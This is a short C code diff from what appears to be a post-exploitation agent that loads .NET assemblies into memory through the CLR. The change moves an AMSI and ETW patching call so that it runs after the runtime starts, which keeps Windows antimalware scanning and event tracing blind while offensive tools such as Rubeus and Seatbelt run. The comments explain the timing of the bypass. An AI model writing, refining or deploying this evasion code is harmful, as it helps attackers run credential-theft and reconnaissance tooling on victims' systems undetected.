@@ -434,6 +434,11 @@ char* dotnet_exec(const uint8_t *asm_bytes, size_t asm_len, const char *args, in
         SetStdHandle(STD_ERROR_HANDLE,  hPipe);
     }
 
+    // Patch AMSI+ETW NOW — ICorRuntimeHost::Start() loads amsi.dll into the
+    // process. Patching before Start() is a no-op because amsi.dll is not yet
+    // present and ev_get_module() returns NULL. Must happen before Load_3().
+    clr_amsi_init();
+
     // ── GetDefaultDomain → QI _AppDomain ────────────────────────────────────
     typedef HRESULT (WINAPI *pfnGDD)(void*, IUnknown**);
     IUnknown *pDomThunk = NULL;
@@ -732,12 +737,6 @@ void clr_child_run(void) {
     // VEH fires before those SEH frames and would wrongly terminate the process
     // on any managed exception. Genuine native crashes are reported by the
     // parent via the non-zero exit code path in fork_run_assembly.
-
-    // Unconditionally patch AMSI+ETW before loading the CLR. The child runs
-    // arbitrary .NET assemblies; AMSI hooks cause 0xC0000005 crashes in
-    // P/Invoke-heavy tools (SharpUp, Seatbelt, Rubeus) regardless of whether
-    // the parent agent was built with AGENT_AMSI_BYPASS.
-    clr_amsi_init();
 
     HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);
     BYTE   hdr[4];
